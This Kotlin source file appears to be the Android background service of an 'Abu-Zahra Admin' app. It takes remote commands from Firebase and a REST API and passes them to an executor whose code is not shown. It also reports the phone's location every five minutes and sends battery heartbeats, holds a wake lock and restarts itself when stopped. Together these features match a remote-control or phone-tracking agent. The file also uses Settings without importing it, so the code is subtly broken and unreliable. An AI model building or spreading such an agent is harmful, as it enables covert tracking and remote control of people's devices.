package com.abuzahra.admin.service

import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.abuzahra.admin.R
import com.abuzahra.admin.api.ApiClient
import com.abuzahra.admin.api.FirebaseManager
import com.abuzahra.admin.executor.CommandExecutor
import com.abuzahra.admin.executor.DataCollector
import com.abuzahra.admin.util.DeviceUtils
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.google.gson.Gson
import kotlinx.coroutines.*
import java.util.concurrent.TimeUnit

class CommandService : Service() {

    private val TAG = "CommandService"
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var commandListener: ChildEventListener? = null
    private var heartbeatJob: Job? = null
    private var locationJob: Job? = null
    private var settingsJob: Job? = null
    private var firebaseListenerJob: Job? = null

    companion object {
        const val CHANNEL_ID = "abuzahra_service"
        const val NOTIFICATION_ID = 1001

        fun start(context: Context) {
            val intent = Intent(context, CommandService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, CommandService::class.java))
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification("جاري التشغيل..."))
        Log.i(TAG, "Service created")

        // Request battery optimization exemption
        requestBatteryOptimization()

        // Acquire wake lock
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        val wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "abuzahra:service")
        wakeLock.acquire(10 * 60 * 60 * 1000L) // 10 hours max
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "Service started")
        updateNotification("متصل - بانتظار الأوامر")

        // Start Firebase command listener
        startFirebaseListener()

        // Start heartbeat
        startHeartbeat()

        // Start location tracking
        startLocationTracking()

        // Load settings
        loadSettings()

        // Also poll REST API as backup
        startRestApiPolling()

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.i(TAG, "Service destroyed")
        serviceScope.cancel()
        heartbeatJob?.cancel()
        locationJob?.cancel()
        settingsJob?.cancel()
        firebaseListenerJob?.cancel()

        // Restart service if killed
        if (DeviceUtils.isLinked(this)) {
            val restartIntent = Intent(this, CommandService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent)
            } else {
                startService(restartIntent)
            }
        }
    }

    // ===== FIREBASE LISTENER =====
    private fun startFirebaseListener() {
        val deviceId = DeviceUtils.getDeviceId(this)
        val ref = com.google.firebase.database.FirebaseDatabase.getInstance()
            .getReferenceFromUrl(com.abuzahra.admin.Config.FIREBASE_RTDB_URL)
            .child("commands/$deviceId")

        commandListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                try {
                    val data = snapshot.value as? Map<*, *> ?: return
                    val json = Gson().toJson(data)
                    val command = Gson().fromJson(json, com.abuzahra.admin.model.Command::class.java)
                    Log.i(TAG, "Firebase command received: ${command.command} (id=${command.id})")
                    CommandExecutor.execute(this@CommandService, command)
                    // Remove after reading
                    snapshot.ref.removeValue()
                } catch (e: Exception) {
                    Log.e(TAG, "onChildAdded error", e)
                }
            }
            override fun onChildChanged(snapshot: DataSnapshot, prev: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, prev: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Firebase listener cancelled: ${error.message}")
                updateNotification("خطأ في Firebase - إعادة المحاولة...")
                // Retry after 5 seconds
                serviceScope.launch {
                    delay(5000)
                    startFirebaseListener()
                }
            }
        }
        ref.addChildEventListener(commandListener as ChildEventListener)
        Log.i(TAG, "Firebase command listener active for device: $deviceId")
    }

    // ===== REST API POLLING (BACKUP) =====
    private fun startRestApiPolling() {
        firebaseListenerJob = serviceScope.launch {
            while (isActive) {
                try {
                    val commands = ApiClient.getCommands(this@CommandService)
                    if (commands.isNotEmpty()) {
                        Log.i(TAG, "REST API: ${commands.size} commands received")
                        commands.forEach { cmd ->
                            CommandExecutor.execute(this@CommandService, cmd)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "REST API polling error", e)
                }
                delay(15000) // Poll every 15 seconds
            }
        }
    }

    // ===== HEARTBEAT =====
    @SuppressLint("BatteryHint")
    private fun startHeartbeat() {
        heartbeatJob = serviceScope.launch {
            while (isActive) {
                try {
                    val batteryInfo = DataCollector.getBattery(this@CommandService)
                    val level = (batteryInfo["level"] as? Int) ?: 0
                    ApiClient.sendHeartbeat(this@CommandService, level, "online")

                    // Update notification
                    val status = if (batteryInfo["status"] == "charging") "🔌 يشحن" else "🔋 $level%"
                    updateNotification("متصل - $status")
                } catch (e: Exception) {
                    Log.e(TAG, "Heartbeat error", e)
                }
                delay(60000) // Every 60 seconds
            }
        }
    }

    // ===== LOCATION TRACKING =====
    private fun startLocationTracking() {
        locationJob = serviceScope.launch {
            while (isActive) {
                try {
                    val location = DataCollector.getLastLocation(this@CommandService)
                    val lat = location["lat"] as? Double ?: continue
                    val lon = location["lon"] as? Double ?: continue
                    val error = location["error"]
                    if (error != null) continue

                    // Send location data
                    ApiClient.sendData(this@CommandService, "location", location)

                    // Add to history
                    com.abuzahra.admin.executor.MonitorExecutor.addLocationToHistory(lat, lon)
                } catch (_: Exception) {}
                delay(300000) // Every 5 minutes
            }
        }
    }

    // ===== SETTINGS =====
    private fun loadSettings() {
        settingsJob = serviceScope.launch {
            try {
                val settings = ApiClient.getSettings(this@CommandService)
                Log.d(TAG, "Settings loaded: ${settings.size} items")
            } catch (e: Exception) {
                Log.e(TAG, "Settings load error", e)
            }
        }
    }

    // ===== NOTIFICATION =====
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Abu-Zahra Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Foreground service for command processing"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(text: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Abu-Zahra Admin")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    private fun updateNotification(text: String) {
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIFICATION_ID, createNotification(text))
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(
                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                android.net.Uri.parse("package:${packageName}")
            )
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            try { startActivity(intent) } catch (_: Exception) {}
        }
    }
}
